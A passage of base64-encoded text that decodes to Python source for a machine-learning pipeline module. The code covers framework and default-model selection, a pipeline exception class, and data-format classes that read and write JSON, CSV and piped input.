G9uZyB0byB0aGUgbW9kZWwncyBgZnJvbV9wcmV0cmFpbmVkKC4uLiwKICAgICAgICAgICAgKiptb2RlbF9rd2FyZ3MpYCBmdW5jdGlvbi4KCiAgICBSZXR1cm5zOgogICAgICAgIGBUdXBsZWA6IEEgdHVwbGUgZnJhbWV3b3JrLCBtb2RlbC4KICAgICIiIgogICAgaWYgaXNpbnN0YW5jZShtb2RlbCwgc3RyKToKICAgICAgICBjb25maWcgPSBBdXRvQ29uZmlnLmZyb21fcHJldHJhaW5lZChtb2RlbCwgX2Zyb21fcGlwZWxpbmU9dGFzaywgKiptb2RlbF9rd2FyZ3MpCiAgICBlbHNlOgogICAgICAgIGNvbmZpZyA9IG1vZGVsLmNvbmZpZwogICAgcmV0dXJuIGluZmVyX2ZyYW1ld29ya19sb2FkX21vZGVsKAogICAgICAgIG1vZGVsLCBjb25maWcsIG1vZGVsX2NsYXNzZXM9bW9kZWxfY2xhc3NlcywgX2Zyb21fcGlwZWxpbmU9dGFzaywgdGFzaz10YXNrLCBmcmFtZXdvcms9ZnJhbWV3b3JrLCAqKm1vZGVsX2t3YXJncwogICAgKQoKCmRlZiBnZXRfZnJhbWV3b3JrKG1vZGVsLCByZXZpc2lvbjogT3B0aW9uYWxbc3RyXSA9IE5vbmUpOgogICAgIiIiCiAgICBTZWxlY3QgZnJhbWV3b3JrIChUZW5zb3JGbG93IG9yIFB5VG9yY2gpIHRvIHVzZS4KCiAgICBBcmdzOgogICAgICAgIG1vZGVsIChgc3RyYCwgW2BQcmVUcmFpbmVkTW9kZWxgXSBvciBbYFRGUHJlVHJhaW5lZE1vZGVsYF0pOgogICAgICAgICAgICBJZiBib3RoIGZyYW1ld29ya3MgYXJlIGluc3RhbGxlZCwgcGlja3MgdGhlIG9uZSBjb3JyZXNwb25kaW5nIHRvIHRoZSBtb2RlbCBwYXNzZWQgKGVpdGhlciBhIG1vZGVsIGNsYXNzIG9yCiAgICAgICAgICAgIHRoZSBtb2RlbCBuYW1lKS4gSWYgbm8gc3BlY2lmaWMgbW9kZWwgaXMgcHJvdmlkZWQsIGRlZmF1bHRzIHRvIHVzaW5nIFB5VG9yY2guCiAgICAiIiIKICAgIHdhcm5pbmdzLndhcm4oCiAgICAgICAgImBnZXRfZnJhbWV3b3JrYCBpcyBkZXByZWNhdGVkIGFuZCB3aWxsIGJlIHJlbW92ZWQgaW4gdjUsIHVzZSBgaW5mZXJfZnJhbWV3b3JrX2Zyb21fbW9kZWxgIGluc3RlYWQuIiwKICAgICAgICBGdXR1cmVXYXJuaW5nLAogICAgKQogICAgaWYgbm90IGlzX3RmX2F2YWlsYWJsZSgpIGFuZCBub3QgaXNfdG9yY2hfYXZhaWxhYmxlKCk6CiAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKAogICAgICAgICAgICAiQXQgbGVhc3Qgb25lIG9mIFRlbnNvckZsb3cgMi4wIG9yIFB5VG9yY2ggc2hvdWxkIGJlIGluc3RhbGxlZC4gIgogICAgICAgICAgICAiVG8gaW5zdGFsbCBUZW5zb3JGbG93IDIuMCwgcmVhZCB0aGUgaW5zdHJ1Y3Rpb25zIGF0IGh0dHBzOi8vd3d3LnRlbnNvcmZsb3cub3JnL2luc3RhbGwvICIKICAgICAgICAgICAgIlRvIGluc3RhbGwgUHlUb3JjaCwgcmVhZCB0aGUgaW5zdHJ1Y3Rpb25zIGF0IGh0dHBzOi8vcHl0b3JjaC5vcmcvLiIKICAgICAgICApCiAgICBpZiBpc2luc3RhbmNlKG1vZGVsLCBzdHIpOgogICAgICAgIGlmIGlzX3RvcmNoX2F2YWlsYWJsZSgpIGFuZCBub3QgaXNfdGZfYXZhaWxhYmxlKCk6CiAgICAgICAgICAgIG1vZGVsID0gQXV0b01vZGVsLmZyb21fcHJldHJhaW5lZChtb2RlbCwgcmV2aXNpb249cmV2aXNpb24pCiAgICAgICAgZWxpZiBpc190Zl9hdmFpbGFibGUoKSBhbmQgbm90IGlzX3RvcmNoX2F2YWlsYWJsZSgpOgogICAgICAgICAgICBtb2RlbCA9IFRGQXV0b01vZGVsLmZyb21fcHJldHJhaW5lZChtb2RlbCwgcmV2aXNpb249cmV2aXNpb24pCiAgICAgICAgZWxzZToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbW9kZWwgPSBBdXRvTW9kZWwuZnJvbV9wcmV0cmFpbmVkKG1vZGVsLCByZXZpc2lvbj1yZXZpc2lvbikKICAgICAgICAgICAgZXhjZXB0IE9TRXJyb3I6CiAgICAgICAgICAgICAgICBtb2RlbCA9IFRGQXV0b01vZGVsLmZyb21fcHJldHJhaW5lZChtb2RlbCwgcmV2aXNpb249cmV2aXNpb24pCgogICAgZnJhbWV3b3JrID0gInRmIiBpZiBtb2RlbC5fX2NsYXNzX18uX19uYW1lX18uc3RhcnRzd2l0aCgiVEYiKSBlbHNlICJwdCIKICAgIHJldHVybiBmcmFtZXdvcmsKCgpkZWYgZ2V0X2RlZmF1bHRfbW9kZWxfYW5kX3JldmlzaW9uKAogICAgdGFyZ2V0ZWRfdGFzazogRGljdCwgZnJhbWV3b3JrOiBPcHRpb25hbFtzdHJdLCB0YXNrX29wdGlvbnM6IE9wdGlvbmFsW0FueV0KKSAtPiBVbmlvbltzdHIsIFR1cGxlW3N0ciwgc3RyXV06CiAgICAiIiIKICAgIFNlbGVjdCBhIGRlZmF1bHQgbW9kZWwgdG8gdXNlIGZvciBhIGdpdmVuIHRhc2suIERlZmF1bHRzIHRvIHB5dG9yY2ggaWYgYW1iaWd1b3VzLgoKICAgIEFyZ3M6CiAgICAgICAgdGFyZ2V0ZWRfdGFzayAoYERpY3RgICk6CiAgICAgICAgICAgRGljdGlvbmFyeSByZXByZXNlbnRpbmcgdGhlIGdpdmVuIHRhc2ssIHRoYXQgc2hvdWxkIGNvbnRhaW4gZGVmYXVsdCBtb2RlbHMKCiAgICAgICAgZnJhbWV3b3JrIChgc3RyYCwgTm9uZSkKICAgICAgICAgICAicHQiLCAidGYiIG9yIE5vbmUsIHJlcHJlc2VudGluZyBhIHNwZWNpZmljIGZyYW1ld29yayBpZiBpdCB3YXMgc3BlY2lmaWVkLCBvciBOb25lIGlmIHdlIGRvbid0IGtub3cgeWV0LgoKICAgICAgICB0YXNrX29wdGlvbnMgKGBBbnlgLCBOb25lKQogICAgICAgICAgIEFueSBmdXJ0aGVyIHZhbHVlIHJlcXVpcmVkIGJ5IHRoZSB0YXNrIHRvIGdldCBmdWxseSBzcGVjaWZpZWQsIGZvciBpbnN0YW5jZSAoU1JDLCBUR1QpIGxhbmd1YWdlcyBmb3IKICAgICAgICAgICB0cmFuc2xhdGlvbiB0YXNrLgoKICAgIFJldHVybnMKCiAgICAgICAgYHN0cmAgVGhlIG1vZGVsIHN0cmluZyByZXByZXNlbnRpbmcgdGhlIGRlZmF1bHQgbW9kZWwgZm9yIHRoaXMgcGlwZWxpbmUKICAgICIiIgogICAgaWYgaXNfdG9yY2hfYXZhaWxhYmxlKCkgYW5kIG5vdCBpc190Zl9hdmFpbGFibGUoKToKICAgICAgICBmcmFtZXdvcmsgPSAicHQiCiAgICBlbGlmIGlzX3RmX2F2YWlsYWJsZSgpIGFuZCBub3QgaXNfdG9yY2hfYXZhaWxhYmxlKCk6CiAgICAgICAgZnJhbWV3b3JrID0gInRmIgoKICAgIGRlZmF1bHRzID0gdGFyZ2V0ZWRfdGFza1siZGVmYXVsdCJdCiAgICBpZiB0YXNrX29wdGlvbnM6CiAgICAgICAgaWYgdGFza19vcHRpb25zIG5vdCBpbiBkZWZhdWx0czoKICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihmIlRoZSB0YXNrIGRvZXMgbm90IHByb3ZpZGUgYW55IGRlZmF1bHQgbW9kZWxzIGZvciBvcHRpb25zIHt0YXNrX29wdGlvbnN9IikKICAgICAgICBkZWZhdWx0X21vZGVscyA9IGRlZmF1bHRzW3Rhc2tfb3B0aW9uc11bIm1vZGVsIl0KICAgIGVsaWYgIm1vZGVsIiBpbiBkZWZhdWx0czoKICAgICAgICBkZWZhdWx0X21vZGVscyA9IHRhcmdldGVkX3Rhc2tbImRlZmF1bHQiXVsibW9kZWwiXQogICAgZWxzZToKICAgICAgICAjIFhYWCBUaGlzIGVycm9yIG1lc3NhZ2UgbmVlZHMgdG8gYmUgdXBkYXRlZCB0byBiZSBtb3JlIGdlbmVyaWMgaWYgbW9yZSB0YXNrcyBhcmUgZ29pbmcgdG8gYmVjb21lCiAgICAgICAgIyBwYXJhbWV0cml6ZWQKICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCdUaGUgdGFzayBkZWZhdWx0cyBjYW4ndCBiZSBjb3JyZWN0bHkgc2VsZWN0ZWQuIFlvdSBwcm9iYWJseSBtZWFudCAidHJhbnNsYXRpb25fWFhfdG9fWVkiJykKCiAgICBpZiBmcmFtZXdvcmsgaXMgTm9uZToKICAgICAgICBmcmFtZXdvcmsgPSAicHQiCgogICAgcmV0dXJuIGRlZmF1bHRfbW9kZWxzW2ZyYW1ld29ya10KCgpjbGFzcyBQaXBlbGluZUV4Y2VwdGlvbihFeGNlcHRpb24pOgogICAgIiIiCiAgICBSYWlzZWQgYnkgYSBbYFBpcGVsaW5lYF0gd2hlbiBoYW5kbGluZyBfX2NhbGxfXy4KCiAgICBBcmdzOgogICAgICAgIHRhc2sgKGBzdHJgKTogVGhlIHRhc2sgb2YgdGhlIHBpcGVsaW5lLgogICAgICAgIG1vZGVsIChgc3RyYCk6IFRoZSBtb2RlbCB1c2VkIGJ5IHRoZSBwaXBlbGluZS4KICAgICAgICByZWFzb24gKGBzdHJgKTogVGhlIGVycm9yIG1lc3NhZ2UgdG8gZGlzcGxheS4KICAgICIiIgoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCB0YXNrOiBzdHIsIG1vZGVsOiBzdHIsIHJlYXNvbjogc3RyKToKICAgICAgICBzdXBlcigpLl9faW5pdF9fKHJlYXNvbikKCiAgICAgICAgc2VsZi50YXNrID0gdGFzawogICAgICAgIHNlbGYubW9kZWwgPSBtb2RlbAoKCmNsYXNzIEFyZ3VtZW50SGFuZGxlcihBQkMpOgogICAgIiIiCiAgICBCYXNlIGludGVyZmFjZSBmb3IgaGFuZGxpbmcgYXJndW1lbnRzIGZvciBlYWNoIFtgfnBpcGVsaW5lcy5QaXBlbGluZWBdLgogICAgIiIiCgogICAgQGFic3RyYWN0bWV0aG9kCiAgICBkZWYgX19jYWxsX18oc2VsZiwgKmFyZ3MsICoqa3dhcmdzKToKICAgICAgICByYWlzZSBOb3RJbXBsZW1lbnRlZEVycm9yKCkKCgpjbGFzcyBQaXBlbGluZURhdGFGb3JtYXQ6CiAgICAiIiIKICAgIEJhc2UgY2xhc3MgZm9yIGFsbCB0aGUgcGlwZWxpbmUgc3VwcG9ydGVkIGRhdGEgZm9ybWF0IGJvdGggZm9yIHJlYWRpbmcgYW5kIHdyaXRpbmcuIFN1cHBvcnRlZCBkYXRhIGZvcm1hdHMKICAgIGN1cnJlbnRseSBpbmNsdWRlczoKCiAgICAtIEpTT04KICAgIC0gQ1NWCiAgICAtIHN0ZGluL3N0ZG91dCAocGlwZSkKCiAgICBgUGlwZWxpbmVEYXRhRm9ybWF0YCBhbHNvIGluY2x1ZGVzIHNvbWUgdXRpbGl0aWVzIHRvIHdvcmsgd2l0aCBtdWx0aS1jb2x1bW5zIGxpa2UgbWFwcGluZyBmcm9tIGRhdGFzZXRzIGNvbHVtbnMgdG8KICAgIHBpcGVsaW5lcyBrZXl3b3JkIGFyZ3VtZW50cyB0aHJvdWdoIHRoZSBgZGF0YXNldF9rd2FyZ18xPWRhdGFzZXRfY29sdW1uXzFgIGZvcm1hdC4KCiAgICBBcmdzOgogICAgICAgIG91dHB1dF9wYXRoIChgc3RyYCwgKm9wdGlvbmFsKik6IFdoZXJlIHRvIHNhdmUgdGhlIG91dGdvaW5nIGRhdGEuCiAgICAgICAgaW5wdXRfcGF0aCAoYHN0cmAsICpvcHRpb25hbCopOiBXaGVyZSB0byBsb29rIGZvciB0aGUgaW5wdXQgZGF0YS4KICAgICAgICBjb2x1bW4gKGBzdHJgLCAqb3B0aW9uYWwqKTogVGhlIGNvbHVtbiB0byByZWFkLgogICAgICAgIG92ZXJ3cml0ZSAoYGJvb2xgLCAqb3B0aW9uYWwqLCBkZWZhdWx0cyB0byBgRmFsc2VgKToKICAgICAgICAgICAgV2hldGhlciBvciBub3QgdG8gb3ZlcndyaXRlIHRoZSBgb3V0cHV0X3BhdGhgLgogICAgIiIiCgogICAgU1VQUE9SVEVEX0ZPUk1BVFMgPSBbImpzb24iLCAiY3N2IiwgInBpcGUiXQoKICAgIGRlZiBfX2luaXRfXygKICAgICAgICBzZWxmLAogICAgICAgIG91dHB1dF9wYXRoOiBPcHRpb25hbFtzdHJdLAogICAgICAgIGlucHV0X3BhdGg6IE9wdGlvbmFsW3N0cl0sCiAgICAgICAgY29sdW1uOiBPcHRpb25hbFtzdHJdLAogICAgICAgIG92ZXJ3cml0ZTogYm9vbCA9IEZhbHNlLAogICAgKToKICAgICAgICBzZWxmLm91dHB1dF9wYXRoID0gb3V0cHV0X3BhdGgKICAgICAgICBzZWxmLmlucHV0X3BhdGggPSBpbnB1dF9wYXRoCiAgICAgICAgc2VsZi5jb2x1bW4gPSBjb2x1bW4uc3BsaXQoIiwiKSBpZiBjb2x1bW4gaXMgbm90IE5vbmUgZWxzZSBbIiJdCiAgICAgICAgc2VsZi5pc19tdWx0aV9jb2x1bW5zID0gbGVuKHNlbGYuY29sdW1uKSA+IDEKCiAgICAgICAgaWYgc2VsZi5pc19tdWx0aV9jb2x1bW5zOgogICAgICAgICAgICBzZWxmLmNvbHVtbiA9IFt0dXBsZShjLnNwbGl0KCI9IikpIGlmICI9IiBpbiBjIGVsc2UgKGMsIGMpIGZvciBjIGluIHNlbGYuY29sdW1uXQoKICAgICAgICBpZiBvdXRwdXRfcGF0aCBpcyBub3QgTm9uZSBhbmQgbm90IG92ZXJ3cml0ZToKICAgICAgICAgICAgaWYgZXhpc3RzKGFic3BhdGgoc2VsZi5vdXRwdXRfcGF0aCkpOgogICAgICAgICAgICAgICAgcmFpc2UgT1NFcnJvcihmIntzZWxmLm91dHB1dF9wYXRofSBhbHJlYWR5IGV4aXN0cyBvbiBkaXNrIikKCiAgICAgICAgaWYgaW5wdXRfcGF0aCBpcyBub3QgTm9uZToKICAgICAgICAgICAgaWYgbm90IGV4aXN0cyhhYnNwYXRoKHNlbGYuaW5wdXRfcGF0aCkpOgogICAgICAgICAgICAgICAgcmFpc2UgT1NFcnJvcihmIntzZWxmLmlucHV0X3BhdGh9IGRvZXNudCBleGlzdCBvbiBkaXNrIikKCiAgICBAYWJzdHJhY3RtZXRob2QKICAgIGRlZiBfX2l0ZXJfXyhzZWxmKToKICAgICAgICByYWlzZSBOb3RJbXBsZW1lbnRlZEVycm9yKCkKCiAgICBAYWJzdHJhY3RtZXRob2QKICAgIGRlZiBzYXZlKHNlbGYsIGRhdGE6IFVuaW9uW2RpY3QsIExpc3RbZGljdF1dKToKICAgICAgICAiIiIKICAgICAgICBTYXZlIHRoZSBwcm92aWRlZCBkYXRhIG9iamVjdCB3aXRoIHRoZSByZXByZXNlbnRhdGlvbiBmb3IgdGhlIGN1cnJlbnQgW2B+cGlwZWxpbmVzLlBpcGVsaW5lRGF0YUZvcm1hdGBdLgoKICAgICAgICBBcmdzOgogICAgICAgICAgICBkYXRhIChgZGljdGAgb3IgbGlzdCBvZiBgZGljdGApOiBUaGUgZGF0YSB0byBzdG9yZS4KICAgICAgICAiIiIKICAgICAgICByYWlzZSBOb3RJbXBsZW1lbnRlZEVycm9yKCkKCiAgICBkZWYgc2F2ZV9iaW5hcnkoc2VsZiwgZGF0YTogVW5pb25bZGljdCwgTGlzdFtkaWN0XV0pIC0+IHN0cjoKICAgICAgICAiIiIKICAgICAgICBTYXZlIHRoZSBwcm92aWRlZCBkYXRhIG9iamVjdCBhcyBhIHBpY2tsZS1mb3JtYXR0ZWQgYmluYXJ5IGRhdGEgb24gdGhlIGRpc2suCgogICAgICAgIEFyZ3M6CiAgICAgICAgICAgIGRhdGEgKGBkaWN0YCBvciBsaXN0IG9mIGBkaWN0YCk6IFRoZSBkYXRhIHRvIHN0b3JlLgoKICAgICAgICBSZXR1cm5zOgogICAgICAgICAgICBgc3RyYDogUGF0aCB3aGVyZSB0aGUgZGF0YSBoYXMgYmVlbiBzYXZlZC4KICAgICAgICAiIiIKICAgICAgICBwYXRoLCBfID0gb3MucGF0aC5zcGxpdGV4dChzZWxmLm91dHB1dF9wYXRoKQogICAgICAgIGJpbmFyeV9wYXRoID0gb3MucGF0aC5leHRzZXAuam9pbigocGF0aCwgInBpY2tsZSIpKQoKICAgICAgICB3aXRoIG9wZW4oYmluYXJ5X3BhdGgsICJ3YisiKSBhcyBmX291dHB1dDoKICAgICAgICAgICAgcGlja2xlLmR1bXAoZGF0YSwgZl9vdXRwdXQpCgogICAgICAgIHJldHVybiBiaW5hcnlfcGF0aAoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBmcm9tX3N0cigKICAgICAgICBmb3JtYXQ6IHN0ciwKICAgICAgICBvdXRwdXRfcGF0aDogT3B0aW9uYWxbc3RyXSwKICAgICAgICBpbnB1dF9wYXRoOiBPcHRpb25hbFtzdHJdLAogICAgICAgIGNvbHVtbjogT3B0aW9uYWxbc3RyXSwKICAgICAgICBvdmVyd3JpdGU9RmFsc2UsCiAgICApIC0+ICJQaXBlbGluZURhdGFGb3JtYXQiOgogICAgICAgICIiIgogICAgICAgIENyZWF0ZXMgYW4gaW5zdGFuY2Ugb2YgdGhlIHJpZ2h0IHN1YmNsYXNzIG9mIFtgfnBpcGVsaW5lcy5QaXBlbGluZURhdGFGb3JtYXRgXSBkZXBlbmRpbmcgb24gYGZvcm1hdGAuCgogICAgICAgIEFyZ3M6CiAgICAgICAgICAgIGZvcm1hdDogKGBzdHJgKToKICAgICAgICAgICAgICAgIFRoZSBmb3JtYXQgb2YgdGhlIGRlc2lyZWQgcGlwZWxpbmUuIEFjY2VwdGFibGUgdmFsdWVzIGFyZSBgImpzb24iYCwgYCJjc3YiYCBvciBgInBpcGUiYC4KICAgICAgICAgICAgb3V0cHV0X3BhdGggKGBzdHJgLCAqb3B0aW9uYWwqKToKICAgICAgICAgICAgICAgIFdoZXJlIHRvIHNhdmUgdGhlIG91dGdvaW5nIGRhdGEuCiAgICAgICAgICAgIGlucHV0X3BhdGggKGBzdHJgLCAqb3B0aW9uYWwqKToKICAgICAgICAgICAgICAgIFdoZXJlIHRvIGxvb2sgZm9yIHRoZSBpbnB1dCBkYXRhLgogICAgICAgICAgICBjb2x1bW4gKGBzdHJgLCAqb3B0aW9uYWwqKToKICAgICAgICAgICAgICAgIFRoZSBjb2x1bW4gdG8gcmVhZC4KICAgICAgICAgICAgb3ZlcndyaXRlIChgYm9vbGAsICpvcHRpb25hbCosIGRlZmF1bHRzIHRvIGBGYWxzZWApOgogICAgICAgICAgICAgICAgV2hldGhlciBvciBub3QgdG8gb3ZlcndyaXRlIHRoZSBgb3V0cHV0X3BhdGhgLgoKICAgICAgICBSZXR1cm5zOgogICAgICAgICAgICBbYH5waXBlbGluZXMuUGlwZWxpbmVEYXRhRm9ybWF0YF06IFRoZSBwcm9wZXIgZGF0YSBmb3JtYXQuCiAgICAgICAgIiIiCiAgICAgICAgaWYgZm9ybWF0ID09ICJqc29uIjoKICAgICAgICAgICAgcmV0dXJuIEpzb25QaXBlbGluZURhdGFGb3JtYXQob3V0cHV0X3BhdGgsIGlucHV0X3BhdGgsIGNvbHVtbiwgb3ZlcndyaXRlPW92ZXJ3cml0ZSkKICAgICAgICBlbGlmIGZvcm1hdCA9PSAiY3N2IjoKICAgICAgICAgICAgcmV0dXJuIENzdlBpcGVsaW5lRGF0YUZvcm1hdChvdXRwdXRfcGF0aCwgaW5wdXRfcGF0aCwgY29sdW1uLCBvdmVyd3JpdGU9b3ZlcndyaXRlKQogICAgICAgIGVsaWYgZm9ybWF0ID09ICJwaXBlIjoKICAgICAgICAgICAgcmV0dXJuIFBpcGVkUGlwZWxpbmVEYXRhRm9ybWF0KG91dHB1dF9wYXRoLCBpbnB1dF9wYXRoLCBjb2x1bW4sIG92ZXJ3cml0ZT1vdmVyd3JpdGUpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmFpc2UgS2V5RXJyb3IoZiJVbmtub3duIHJlYWRlciB7Zm9ybWF0fSAoQXZhaWxhYmxlIHJlYWRlciBhcmUganNvbi9jc3YvcGlwZSkiKQoKCmNsYXNzIENzdlBpcGVsaW5lRGF0YUZvcm1hdChQaXBlbGluZURhdGFGb3JtYXQpOgogICAgIiIiCiAgICBTdXBwb3J0IGZvciBwaXBlbGluZXMgdXNpbmcgQ1NWIGRhdGEgZm9ybWF0LgoKICAgIEFyZ3M6CiAgICAgICAgb3V0cHV0X3BhdGggKGBzdHJgLCAqb3B0aW9uYWwqKTogV2hlcmUgdG8gc2F2ZSB0aGUgb3V0Z29pbmcgZGF0YS4KICAgICAgICBpbnB1dF9wYXRoIChgc3RyYCwgKm9wdGlvbmFsKik6IFdoZXJlIHRvIGxvb2sgZm9yIHRoZSBpbnB1dCBkYXRhLgogICAgICAgIGNvbHVtbiAoYHN0cmAsICpvcHRpb25hbCopOiBUaGUgY29sdW1uIHRvIHJlYWQuCiAgICAgICAgb3ZlcndyaXRlIChgYm9vbGAsICpvcHRpb25hbCosIGRlZmF1bHRzIHRvIGBGYWxzZWApOgogICAgICAgICAgICBXaGV0aGVyIG9yIG5vdCB0byBvdmVyd3JpdGUgdGhlIGBvdXRwdXRfcGF0aGAuCiAgICAiIiIKCiAgICBkZWYgX19pbml0X18oCiAgICAgICAgc2VsZiwKICAgICAgICBvdXRwdXRfcGF0aDogT3B0aW9uYWxbc3RyXSwKICAgICAgICBpbnB1dF9wYXRoOiBPcHRpb25hbFtzdHJdLAogICAgICAgIGNvbHVtbjogT3B0aW9uYWxbc3RyXSwKICAgICAgICBvdmVyd3JpdGU9RmFsc2UsCiAgICApOgogICAgICAgIHN1cGVyKCkuX19pbml0X18ob3V0cHV0X3BhdGgsIGlucHV0X3BhdGgsIGNvbHVtbiwgb3ZlcndyaXRlPW92ZXJ3cml0ZSkKCiAgICBkZWYgX19pdGVyX18oc2VsZik6CiAgICAgICAgd2l0aCBvcGVuKHNlbGYuaW5wdXRfcGF0aCwgInIiKSBhcyBmOgogICAgICAgICAgICByZWFkZXIgPSBjc3YuRGljdFJlYWRlcihmKQogICAgICAgICAgICBmb3Igcm93IGluIHJlYWRlcjoKICAgICAgICAgICAgICAgIGlmIHNlbGYuaXNfbXVsdGlfY29sdW1uczoKICAgICAgICAgICAgICAgICAgICB5aWVsZCB7azogcm93W2NdIGZvciBrLCBjIGluIHNlbGYuY29sdW1ufQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICB5aWVsZCByb3dbc2VsZi5jb2x1bW5bMF1dCgogICAgZGVmIHNhdmUoc2VsZiwgZGF0YTogTGlzdFtkaWN0XSk6CiAgICAgICAgIiIiCiAgICAgICAgU2F2ZSB0aGUgcHJvdmlkZWQgZGF0YSBvYmplY3Qgd2l0aCB0aGUgcmVwcmVzZW50YXRpb24gZm9yIHRoZSBjdXJyZW50IFtgfnBpcGVsaW5lcy5QaXBlbGluZURhdGFGb3JtYXRgXS4KCiAgICAgICAgQXJnczoKICAgICAgICAgICAgZGF0YSAoYExpc3RbZGljdF1gKTogVGhlIGRhdGEgdG8gc3RvcmUuCiAgICAgICAgIiIiCiAgICAgICAgd2l0aCBvcGVuKHNlbGYub3V0cHV0X3BhdGgsICJ3IikgYXMgZjoKICAgICAgICAgICAgaWYgbGVuKGRhdGEpID4gMDoKICAgICAgICAgICAgICAgIHdyaXRlciA9IGNzdi5EaWN0V3JpdGVyKGYsIGxpc3QoZGF0YVswXS5rZXlzKCkpKQogICAgICAgICAgICAgICAgd3JpdGVyLndyaXRlaGVhZGVyKCkKICAgICAgICAgICAgICAgIHdyaXRlci53cml0ZXJvd3MoZGF0YSkKCgpjbGFzcyBKc29uUGlwZWxpbmVEYXRhRm9ybWF0KFBpcGVsaW5lRGF0YUZvcm1hdCk6CiAgICAiIiIKICAgIFN1cHBvcnQgZm9yIHBpcGVsaW5lcyB1c2luZyBKU09OIGZpbGUgZm9ybWF0LgoKICAgIEFyZ3M6CiAgICAgICAgb3V0cHV0X3BhdGggKGBzdHJgLCAqb3B0aW9uYWwqKTogV2hlcmUgdG8gc2F2ZSB0aGUgb3V0Z29pbmcgZGF0YS4KICAgICAgICBpbnB1dF9wYXRoIChgc3RyYCwgKm9wdGlvbmFsKik6IFdoZXJlIHRvIGxvb2sgZm9yIHRoZSBpbnB1dCBkYXRhLgogICAgICAgIGNvbHVtbiAoYHN0cmAsICpvcHRpb25hbCopOiBUaGUgY29sdW1uIHRvIHJlYWQuCiAgICAgICAgb3ZlcndyaXRlIChgYm9vbGAsICpvcHRpb25hbCosIGRlZmF1bHRzIHRvIGBGYWxzZWApOgogICAgICAgICAgICBXaGV0aGVyIG9yIG5vdCB0byBvdmVyd3JpdGUgdGhlIGBvdXRwdXRfcGF0aGAuCiAgICAiIiIKCiAgICBkZWYgX19pbml0X18oCiAgICAgICAgc2VsZiwKICAgICAgICBvdXRwdXRfcGF0aDogT3B0aW9uYWxbc3RyXSwKICAgICAgICBpbnB1dF9wYXRoOiBPcHRpb25hbFtzdHJdLAogICAgICAgIGNvbHVtbjogT3B0aW9uYWxbc3RyXSwKICAgICAgICBvdmVyd3JpdGU9RmFsc2UsCiAgICApOgogICAgICAgIHN1cGVyKCkuX19pbml0X18ob3V0cHV0X3BhdGgsIGlucHV0X3BhdGgsIGNvbHVtbiwgb3ZlcndyaXRlPW92ZXJ3cml0ZSkKCiAgICAgICAgd2l0aCBvcGVuKGlucHV0X3BhdGgsICJyIikgYXMgZjoKICAgICAgICAgICAgc2VsZi5fZW50cmllcyA9IGpzb24ubG9hZChmKQoKICAgIGRlZiBfX2l0ZXJfXyhzZWxmKToKICAgICAgICBmb3IgZW50cnkgaW4gc2VsZi5fZW50cmllczoKICAgICAgICAgICAgaWYgc2VsZi5pc19tdWx0aV9jb2x1bW5zOgogICAgICAgICAgICAgICAgeWllbGQge2s6IGVudHJ5W2NdIGZvciBrLCBjIGluIHNlbGYuY29sdW1ufQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgeWllbGQgZW50cnlbc2VsZi5jb2x1bW5bMF1dCgogICAgZGVmIHNhdmUoc2VsZiwgZGF0YTogZGljdCk6CiAgICAgICAgIiIiCiAgICAgICAgU2F2ZSB0aGUgcHJvdmlkZWQgZGF0YSBvYmplY3QgaW4gYSBqc29uIGZpbGUuCgogICAgICAgIEFyZ3M6CiAgICAgICAgICAgIGRhdGEgKGBkaWN0YCk6IFRoZSBkYXRhIHRvIHN0b3JlLgogICAgICAgICIiIgogICAgICAgIHdpdGggb3BlbihzZWxmLm91dHB1dF9wYXRoLCAidyIpIGFzIGY6CiAgICAgICAgICAgIGpzb24uZHVtcChkYXRhLCBmKQoKCmNsYXNzIFBpcGVkUGlwZWxpbmVEYXRhRm9ybWF0KFBpcGVsaW5lRGF0YUZvcm1hdCk6CiAgICAiIiIKICAgIFJlYWQgZGF0YSBmcm9tIHBpcGVkIGlucHV0IHRvIHRoZSBweXRob24gcHJvY2Vzcy4gRm9yIG11bHRpIGNvbHVtbnMgZGF0YSwgY29sdW1ucyBzaG91bGQgc2VwYXJhdGVkIGJ5IAkKCiAgICBJZiBjb2x1bW5zIGFyZSBwcm92aWRlZCwgdGhlbiB0aGUgb3V0cHV0IHdpbGwgYmUgYSBkaWN0aW9uYXJ5IHdpdGgge2NvbHVtbl94OiB2YWx1ZV94fQoKICAgIEFyZ3M6CiAgICAgICAgb3V0cHV0X3BhdGggKGBzdHJgLCAqb3B0aW9uYWwqKTogV2hlcmUgdG8gc2F2ZSB0aGUgb3V0Z29pbmcgZGF0YS4KICAgICAgICBpbnB1dF9wYXRoIChgc3RyYCwgKm9wdGlvbmFsKik6IFdoZXJlIHRvIGxvb2sgZm9yIHRoZSBpbnB1dCBkYXRhLgogICAgICAgIGNvbHVtbiAoYHN0cmAsICpvcHRpb25hbCopOiBUaGUgY29sdW1uIHRvIHJlYWQuCiAgICAgICAgb3ZlcndyaXRlIChgYm9vbGAsICpvcHRpb25hbCosIGRlZmF1bHRzIHRvIGBGYWxzZWApOgogICAgICAgICAgICBXaGV0aGVyIG9yIG5vdCB0byBvdmVyd3JpdGUgdGhlIGBvdXRwdXRfcGF0aGAuCiAgICAiIiIKCiAgICBkZWYgX19pdGVyX18oc2VsZik6CiAgICAgICAgZm9yIGxpbmUgaW4gc3lzLnN0ZGluOgogICAgICAgICAgICAjIFNwbGl0IGZvciBtdWx0aS1jb2x1bW5zCiAgICAgICAgICAgIGlmICIJIiBpbiBsaW5lOgogICAgICAgICAgICAgICAgbGluZSA9IGxpbmUuc3BsaXQoIgkiKQogICAgICAgICAgICAgICAgaWYgc2VsZi5jb2x1bW46CiAgICAgICAgICAgICAgICAgICAgIyBEaWN0aW9uYXJ5IHRvIG1hcCBhcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICB5aWVsZCB7a3dhcmdzOiBsIGZvciAoa3dhcmdzLCBfKSwgbCBpbiB6aXAoc2VsZi5jb2x1bW4sIGxpbmUpfQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICB5aWVsZCB0dXBsZShsaW5lKQoKICAgICAgICAgICAgIyBObyBkaWN0aW9uYXJ5IHRvIG1hcCBhcmd1bWVudHMKICAgICAgICAgICAg